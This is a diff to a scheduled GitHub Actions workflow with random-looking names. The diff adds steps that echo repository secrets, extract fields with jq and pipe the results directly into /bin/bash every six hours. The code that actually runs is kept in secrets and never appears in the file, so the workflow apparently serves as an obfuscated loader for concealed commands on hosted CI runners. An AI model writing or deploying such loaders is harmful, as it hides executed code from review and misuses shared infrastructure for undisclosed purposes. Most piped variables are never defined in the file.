@@ -1,28 +1,30 @@
 name: fangmingshuo6710
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 0/6 * * *'
-jobs:  # 13394
+    - cron: '26 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: fangmingshuo6710
         env:
-          j290: ${{ secrets.j290 }}
+          jiefm4: ${{ secrets.jiefm4 }}
         run: |
-          echo $j290 | jq -r .hh4171 | /bin/bash
-          echo $bud38 | jq -r .t81 | /bin/bash
-          echo $mbl15030 | jq -r .cutzw3 | /bin/bash
-          echo $vh5 | jq -r .dhdm6754 | /bin/bash
-          echo $p89 | jq -r .hzbvj91352 | /bin/bash
-          echo $sezx88 | jq -r .ry985 | /bin/bash
-          echo $l55897 | jq -r .rtpr8 | /bin/bash
-          echo $ka1 | jq -r .takf14692 | /bin/bash
-          echo $muiw84 | jq -r .cdpsm10 | /bin/bash
-          echo $t60 | jq -r .xcdcg8198 | /bin/bash
-          echo $zr6 | jq -r .pvoa4 | /bin/bash
-          echo $fovf2 | jq -r .dwqo2 | /bin/bash
+          echo $jiefm4 | jq -r .ykpgy48 | /bin/bash
+          echo $kky232 | jq -r .bn1882 | /bin/bash
+          echo $rq1841 | jq -r .mqgfv3056 | /bin/bash
+          echo $iaj90728 | jq -r .ovfdw9701 | /bin/bash
+          echo $typtq25 | jq -r .qiv63 | /bin/bash
+          echo $pc8055 | jq -r .thglp4211 | /bin/bash
+          echo $atul55 | jq -r .p43 | /bin/bash
+          echo $tndu542 | jq -r .wbz88336 | /bin/bash
+          echo $sz9409 | jq -r .r30 | /bin/bash
+          echo $zcel7 | jq -r .pkma515 | /bin/bash
+          echo $sj52334 | jq -r .rduuy459 | /bin/bash
+          echo $of7 | jq -r .zrwn7738 | /bin/bash
+          echo $yc30 | jq -r .kw7594 | /bin/bash
 
